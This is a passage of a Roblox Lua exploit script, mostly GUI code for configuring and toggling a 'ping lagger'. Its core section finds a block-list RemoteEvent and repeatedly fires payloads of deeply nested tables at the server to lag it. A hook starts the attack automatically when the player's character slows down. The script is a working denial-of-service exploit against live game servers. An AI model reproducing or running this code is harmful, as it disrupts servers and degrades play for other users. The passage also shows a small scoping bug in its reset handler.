    val.TextColor3         = C.dim
    val.Font               = Enum.Font.GothamBold
    val.TextSize           = 10
    val.TextXAlignment     = Enum.TextXAlignment.Right
    val.ZIndex             = 22
    val.AutoButtonColor = false

    return {row = row, lbl = lbl, val = val}
end

-- ── Funcion para hacer editable un valor ────────────
local function makeEditable(rowObj, fieldKey, labelText)
    local valBtn = rowObj.val
    local editing = false
    local editBox = nil

    local function finishEdit(save)
        if editBox then
            if save then
                local newText = editBox.Text
                local num = tonumber(newText)
                if num and num > 0 then
                    cfg[fieldKey] = num
                    valBtn.Text = tostring(num)
                    valBtn.TextColor3 = C.dim
                    saveConfig()
                else
                    valBtn.Text = tostring(cfg[fieldKey])
                    valBtn.TextColor3 = C.dim
                end
            else
                valBtn.Text = tostring(cfg[fieldKey])
                valBtn.TextColor3 = C.dim
            end
            editing = false
            editBox.Visible = false
            editBox:Destroy()
            editBox = nil
            valBtn.Visible = true
        end
    end

    valBtn.MouseButton1Click:Connect(function()
        if editing then return end
        if locked then return end

        editing = true
        valBtn.Visible = false

        editBox = Instance.new("TextBox", valBtn.Parent)
        editBox.Size = valBtn.Size
        editBox.Position = valBtn.Position
        editBox.BackgroundColor3 = C.inputBg
        editBox.BackgroundTransparency = 0.15
        editBox.BorderSizePixel = 0
        editBox.Text = tostring(cfg[fieldKey])
        editBox.TextColor3 = C.white
        editBox.Font = Enum.Font.GothamBold
        editBox.TextSize = 10
        editBox.TextXAlignment = Enum.TextXAlignment.Right
        editBox.ZIndex = 25
        Instance.new("UICorner", editBox).CornerRadius = UDim.new(0,6)
        local stroke = Instance.new("UIStroke", editBox)
        stroke.Color = C.white
        stroke.Thickness = 1.5
        stroke.Transparency = 0.3
        editBox:CaptureFocus()

        editBox.FocusLost:Connect(function(enterPressed)
            finishEdit(enterPressed)
        end)
    end)
end

-- ── Keybind row ─────────────────────────────────────────────────
local kbBindBtn, gpBindBtn

local function updateKbLabels()
    if kbBindBtn then
        if listeningFor == "kb" then
            kbBindBtn.Text      = "..."
            kbBindBtn.TextColor3 = C.waiting
        else
            kbBindBtn.Text      = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
            kbBindBtn.TextColor3 = C.white
        end
    end
    if gpBindBtn then
        if listeningFor == "gp" then
            gpBindBtn.Text      = "..."
            gpBindBtn.TextColor3 = C.waiting
        else
            gpBindBtn.Text      = cfg.keybindGp ~= "" and cfg.keybindGp or "None"
            gpBindBtn.TextColor3 = C.white
        end
    end
end

local function mkKeybindRow(yPos, labelText, which)
    local row = Instance.new("Frame", settingsFrame)
    row.Size             = UDim2.new(1,-16,0,28)
    row.Position         = UDim2.new(0,8,0,yPos)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0
    row.BorderSizePixel  = 0
    row.ZIndex           = 21
    Instance.new("UICorner", row).CornerRadius = UDim.new(0,6)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size               = UDim2.new(0.4,0,1,0)
    lbl.Position           = UDim2.new(0,10,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text               = labelText
    lbl.TextColor3         = C.white
    lbl.Font               = Enum.Font.GothamBold
    lbl.TextSize           = 10
    lbl.TextXAlignment     = Enum.TextXAlignment.Left
    lbl.ZIndex             = 22

    local bindBtn = Instance.new("TextButton", row)
    bindBtn.Size             = UDim2.new(0,60,0,20)
    bindBtn.Position         = UDim2.new(1,-68,0.5,-10)
    bindBtn.BackgroundColor3 = C.inputBg
    bindBtn.BackgroundTransparency = T.inputBg
    bindBtn.BorderSizePixel  = 0
    bindBtn.AutoButtonColor  = false
    bindBtn.Font             = Enum.Font.GothamBold
    bindBtn.TextSize         = 9
    bindBtn.TextColor3       = C.white
    bindBtn.ZIndex           = 23
    bindBtn.Text             = which == "kb" and cfg.keybindKb or cfg.keybindGp
    Instance.new("UICorner", bindBtn).CornerRadius = UDim.new(0,6)

    local bStr = Instance.new("UIStroke",bindBtn); bStr.Color=C.white; bStr.Thickness=1; bStr.Transparency=0.5
    bindBtn.MouseEnter:Connect(function() tw(bStr,{Transparency=0},0.1) end)
    bindBtn.MouseLeave:Connect(function() tw(bStr,{Transparency=0.5},0.1) end)

    bindBtn.MouseButton1Click:Connect(function()
        listeningFor = (listeningFor == which) and nil or which
        updateKbLabels()
    end)

    if which == "kb" then kbBindBtn = bindBtn end
    if which == "gp" then gpBindBtn = bindBtn end

    return bindBtn
end

-- ── Auto Brainrot toggle row ────────────────────────────────
local autoBrainrotBtn
local autoValLbl

local function createBrainrotRow(yPos)
    local row = Instance.new("Frame", settingsFrame)
    row.Size             = UDim2.new(1,-16,0,28)
    row.Position         = UDim2.new(0,8,0,yPos)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0
    row.BorderSizePixel  = 0
    row.ZIndex           = 21
    Instance.new("UICorner", row).CornerRadius = UDim.new(0,6)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size               = UDim2.new(0.6,0,1,0)
    lbl.Position           = UDim2.new(0,10,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text               = "AUTO BRAINROT"
    lbl.TextColor3         = C.white
    lbl.Font               = Enum.Font.GothamBold
    lbl.TextSize           = 10
    lbl.TextXAlignment     = Enum.TextXAlignment.Left
    lbl.ZIndex             = 22

    local valLbl = Instance.new("TextLabel", row)
    valLbl.Size               = UDim2.new(0.3,0,1,0)
    valLbl.Position           = UDim2.new(0.6,0,0,0)
    valLbl.BackgroundTransparency = 1
    valLbl.Text               = cfg.autoBrainrot and "ACTIVADO" or "DESACTIVADO"
    valLbl.TextColor3         = cfg.autoBrainrot and C.green or C.red3
    valLbl.Font               = Enum.Font.GothamBold
    valLbl.TextSize           = 10
    valLbl.TextXAlignment     = Enum.TextXAlignment.Right
    valLbl.ZIndex             = 22
    autoValLbl = valLbl

    local toggleBtn = Instance.new("TextButton", row)
    toggleBtn.Size             = UDim2.new(0,22,0,20)
    toggleBtn.Position         = UDim2.new(1,-28,0.5,-10)
    toggleBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(40,20,20)
    toggleBtn.BorderSizePixel  = 0
    toggleBtn.AutoButtonColor  = false
    toggleBtn.Text             = ""
    toggleBtn.TextColor3       = C.white
    toggleBtn.Font             = Enum.Font.GothamBlack
    toggleBtn.TextSize         = 9
    toggleBtn.ZIndex           = 23
    Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1,0)

    local tStr = Instance.new("UIStroke", toggleBtn)
    tStr.Color = C.white; tStr.Thickness = 1; tStr.Transparency = 0.5

    toggleBtn.MouseButton1Click:Connect(function()
        cfg.autoBrainrot = not cfg.autoBrainrot
        valLbl.Text = cfg.autoBrainrot and "ACTIVADO" or "DESACTIVADO"
        valLbl.TextColor3 = cfg.autoBrainrot and C.green or C.red3
        tw(toggleBtn, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(40,20,20)}, 0.15)
        saveConfig()
    end)

    autoBrainrotBtn = toggleBtn
    return row
end

-- Build config rows
local Y = 36
local GAP = 4

-- Power
local powerRow = mkConfigRow(Y, "POWER", tostring(cfg.power))
makeEditable(powerRow, "power", "POWER")
Y = Y + 28 + GAP

-- Delay
local delayRow = mkConfigRow(Y, "DELAY (SECS)", tostring(cfg.interval))
makeEditable(delayRow, "interval", "DELAY")
Y = Y + 28 + GAP

-- Auto Brainrot
createBrainrotRow(Y)
Y = Y + 28 + GAP + 4

-- KEYBIND label
local kbLabel = Instance.new("TextLabel", settingsFrame)
kbLabel.Size               = UDim2.new(1,-16,0,16)
kbLabel.Position           = UDim2.new(0,8,0,Y)
kbLabel.BackgroundTransparency = 1
kbLabel.Text               = "KEYBIND"
kbLabel.TextColor3         = C.dim
kbLabel.Font               = Enum.Font.GothamBold
kbLabel.TextSize           = 8
kbLabel.TextXAlignment     = Enum.TextXAlignment.Left
kbLabel.ZIndex             = 21
Y = Y + 16

mkKeybindRow(Y, "Keyboard", "kb")
Y = Y + 28 + GAP
mkKeybindRow(Y, "Controller", "gp")
Y = Y + 28 + GAP + 4

-- Botón reset
local resetBtn = Instance.new("TextButton", settingsFrame)
resetBtn.Size             = UDim2.new(1,-16,0,24)
resetBtn.Position         = UDim2.new(0,8,0,Y)
resetBtn.BackgroundColor3 = C.black
resetBtn.BorderSizePixel  = 0
resetBtn.AutoButtonColor  = false
resetBtn.Text             = "Reset Defaults"
resetBtn.TextColor3       = C.white
resetBtn.Font             = Enum.Font.GothamBold
resetBtn.TextSize         = 10
resetBtn.ZIndex           = 21
Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0,6)
local resetStroke = Instance.new("UIStroke", resetBtn)
resetStroke.Color = C.white
resetStroke.Thickness = 1.5
resetStroke.Transparency = 0.4
resetBtn.MouseEnter:Connect(function() tw(resetStroke,{Transparency=0},0.1) end)
resetBtn.MouseLeave:Connect(function() tw(resetStroke,{Transparency=0.4},0.1) end)

resetBtn.MouseButton1Click:Connect(function()
    confirmBackdrop.Visible = true
end)

-- ══════════════════════════════════════════════════════════════════════
-- RESET CONFIRM DIALOG
-- ══════════════════════════════════════════════════════════════════════
local confirmBackdrop = Instance.new("Frame")
confirmBackdrop.Name                   = "ConfirmBackdrop"
confirmBackdrop.Size                   = UDim2.new(1,0,1,0)
confirmBackdrop.BackgroundColor3       = Color3.fromRGB(0,0,0)
confirmBackdrop.BackgroundTransparency = 0.55
confirmBackdrop.BorderSizePixel        = 0
confirmBackdrop.Visible                = false
confirmBackdrop.ZIndex                 = 50
confirmBackdrop.Parent                 = screen

local confirmBox = Instance.new("Frame", confirmBackdrop)
confirmBox.Size             = UDim2.new(0,220,0,110)
confirmBox.Position         = UDim2.new(0.5,-110,0.5,-55)
confirmBox.BackgroundColor3 = C.panel
confirmBox.BackgroundTransparency = T.panel
confirmBox.BorderSizePixel  = 0
confirmBox.ZIndex           = 51
Instance.new("UICorner", confirmBox).CornerRadius = UDim.new(0,10)
applyGradient(confirmBox, C.panel, Color3.fromRGB(8,8,8), 160)

local cStroke = Instance.new("UIStroke", confirmBox)
cStroke.Color = C.white; cStroke.Thickness = 1.5; cStroke.Transparency = 0.3

local confirmLbl = Instance.new("TextLabel", confirmBox)
confirmLbl.Size               = UDim2.new(1,-16,0,44)
confirmLbl.Position           = UDim2.new(0,8,0,8)
confirmLbl.BackgroundTransparency = 1
confirmLbl.Text               = "Reset settings?"
confirmLbl.TextWrapped        = true
confirmLbl.TextColor3         = C.white
confirmLbl.Font               = Enum.Font.GothamBold
confirmLbl.TextSize           = 12
confirmLbl.ZIndex             = 52

local confirmYes = Instance.new("TextButton", confirmBox)
confirmYes.Size             = UDim2.new(0,88,0,28)
confirmYes.Position         = UDim2.new(0,8,1,-36)
confirmYes.BackgroundColor3 = C.black
confirmYes.BorderSizePixel  = 0
confirmYes.AutoButtonColor  = false
confirmYes.Text             = "Confirm"
confirmYes.TextColor3       = C.white
confirmYes.Font             = Enum.Font.GothamBlack
confirmYes.TextSize         = 11
confirmYes.ZIndex           = 52
Instance.new("UICorner", confirmYes).CornerRadius = UDim.new(0,6)
local confirmYesStroke = Instance.new("UIStroke", confirmYes)
confirmYesStroke.Color = C.white
confirmYesStroke.Thickness = 1.5
confirmYesStroke.Transparency = 0.4
confirmYes.MouseEnter:Connect(function() tw(confirmYesStroke,{Transparency=0},0.1) end)
confirmYes.MouseLeave:Connect(function() tw(confirmYesStroke,{Transparency=0.4},0.1) end)

local confirmNo = Instance.new("TextButton", confirmBox)
confirmNo.Size             = UDim2.new(0,88,0,28)
confirmNo.Position         = UDim2.new(1,-96,1,-36)
confirmNo.BackgroundColor3 = C.card
confirmNo.BorderSizePixel  = 0
confirmNo.AutoButtonColor  = false
confirmNo.Text             = "Cancel"
confirmNo.TextColor3       = C.dim
confirmNo.Font             = Enum.Font.GothamBold
confirmNo.TextSize         = 11
confirmNo.ZIndex           = 52
Instance.new("UICorner", confirmNo).CornerRadius = UDim.new(0,6)
local confirmNoStroke = Instance.new("UIStroke", confirmNo)
confirmNoStroke.Color = C.white
confirmNoStroke.Thickness = 1
confirmNoStroke.Transparency = 0.5
confirmNo.MouseEnter:Connect(function()  tw(confirmNo,{TextColor3=C.white},0.1) end)
confirmNo.MouseLeave:Connect(function()  tw(confirmNo,{TextColor3=C.dim},0.1) end)

local function hideConfirm() confirmBackdrop.Visible = false end

confirmNo.MouseButton1Click:Connect(hideConfirm)

confirmYes.MouseButton1Click:Connect(function()
    cfg.power     = DEFAULT_CFG.power
    cfg.interval  = DEFAULT_CFG.interval
    cfg.keybindKb = DEFAULT_CFG.keybindKb
    cfg.keybindGp = DEFAULT_CFG.keybindGp
    cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot
    powerRow.val.Text = tostring(cfg.power)
    delayRow.val.Text = tostring(cfg.interval)
    if autoValLbl then
        autoValLbl.Text = cfg.autoBrainrot and "ACTIVADO" or "DESACTIVADO"
        autoValLbl.TextColor3 = cfg.autoBrainrot and C.green or C.red3
        tw(autoBrainrotBtn, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(40,20,20)}, 0.15)
    end
    updateKbLabels()
    saveConfig()
    hideConfirm()
end)

-- ══════════════════════════════════════════════════════════════════════
-- SETTINGS OPEN / CLOSE (TOGGLE)
-- ══════════════════════════════════════════════════════════════════════
function openSettings()
    settingsOpen          = true
    settingsFrame.Visible = true
    settingsFrame.Size    = UDim2.new(0,SET_W,0,0)
    tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,SET_H)}, 0.2)
    tw(settingsBtn,{BackgroundColor3=C.dim},0.1)
    powerRow.val.Text = tostring(cfg.power)
    delayRow.val.Text = tostring(cfg.interval)
    if autoValLbl then
        autoValLbl.Text = cfg.autoBrainrot and "ACTIVADO" or "DESACTIVADO"
        autoValLbl.TextColor3 = cfg.autoBrainrot and C.green or C.red3
        autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(40,20,20)
    end
    updateKbLabels()
end

function closeSettings()
    settingsOpen = false
    listeningFor = nil
    updateKbLabels()
    tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,0)}, 0.16)
    task.delay(0.18, function() settingsFrame.Visible = false end)
    tw(settingsBtn,{BackgroundColor3=C.black},0.1)
    hideConfirm()
end

-- ══════════════════════════════════════════════════════════════════════
-- PING LAGGER LOGIC
-- ══════════════════════════════════════════════════════════════════════

local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local remote
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then remote = r break end
    end
    if not remote then
        for _, c in ipairs(rrs:GetChildren()) do
            if c:IsA("RemoteEvent") and c.Name:find("Block") then remote = c break end
        end
    end
    return remote
end

remote = findRemote()

local function buildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    local delay = cfg.interval
    while active and remote do
        local payload = buildPayload(cfg.power)
        local ok = pcall(function() remote:FireServer(payload) end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
end

function flipLag(state)
    active = state

    if active then
        if not remote then
            remote = findRemote()
            if not remote then
                active = false
                flipLag(false)
                return
            end
        end
        activateBtn.Text = "DISABLE"
        activateBtn.TextColor3 = C.red3
        activateStroke.Color = C.red1
        activateStroke.Transparency = 0
        tw(activateBtn,{BackgroundColor3=Color3.fromRGB(30,10,10)},0.2)
        tw(mainStroke,{Color=C.green, Transparency=0},0.2)
        task.spawn(runPingLoop)
    else
        activateBtn.Text = "ACTIVATE"
        activateBtn.TextColor3 = C.white
        activateStroke.Color = C.white
        activateStroke.Transparency = 0.4
        tw(activateBtn,{BackgroundColor3=C.card},0.2)
        tw(mainStroke,{Color=C.red1, Transparency=0},0.2)
    end
end

-- ══════════════════════════════════════════════════════════════════════
-- AUTO DETECTION
-- ══════════════════════════════════════════════════════════════════════
RunService.Heartbeat:Connect(function()
    if not cfg.autoBrainrot then
        if brainrotMode then
            brainrotMode = false
            lastBrainrotState = false
        end
        return
    end

    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end

    local hasBrainrot = hum.WalkSpeed < 25

    if hasBrainrot and not lastBrainrotState then
        brainrotMode = true
        lastBrainrotState = true
        manualOverride = false
        flipLag(true)
    elseif not hasBrainrot and lastBrainrotState then
        brainrotMode = false
        lastBrainrotState = false
        manualOverride = false
        flipLag(false)
    end
end)

-- ══════════════════════════════════════════════════════════════════════
-- INPUT HANDLER
-- ══════════════════════════════════════════════════════════════════════
UserInputService.InputBegan:Connect(function(input, processed)
    local kc  = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end

    local isGp = isGamepad(kc)
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard

    if listeningFor then
        if kc == Enum.KeyCode.Escape then
            listeningFor = nil
            updateKbLabels()
            return
        end
        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
            cfg.keybindKb = kc.Name
            listeningFor  = nil
            updateKbLabels()
            saveConfig()
            return
        end
        if listeningFor == "gp" and isGp then
            cfg.keybindGp = kc.Name
            listeningFor  = nil
            updateKbLabels()
            saveConfig()
            return
        end
        return
    end

    if processed then return end

    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        if not mainFrame.Visible then closeSettings() end
        return
    end

    local kbEnum = resolveKb(cfg.keybindKb)
    local gpEnum = resolveKb(cfg.keybindGp)

    if (kbEnum and kc == kbEnum and isKb)
    or (gpEnum and kc == gpEnum and isGp) then
        flipLag(not active)
    end
end)

updateKbLabels()

-- ══════════════════════════════════════════════════════════════════════
-- INICIAR INTRO Y MOSTRAR GUI CUANDO TERMINE
-- ══════════════════════════════════════════════════════════════════════
onIntroFinished(function()
    if mainFrame then
        mainFrame.Visible = true
    end
end)

task.spawn(function()
    pcall(IntroSemDuelsStyle)
    if not _introFinished then 
        markIntroFinished() 
    end
end)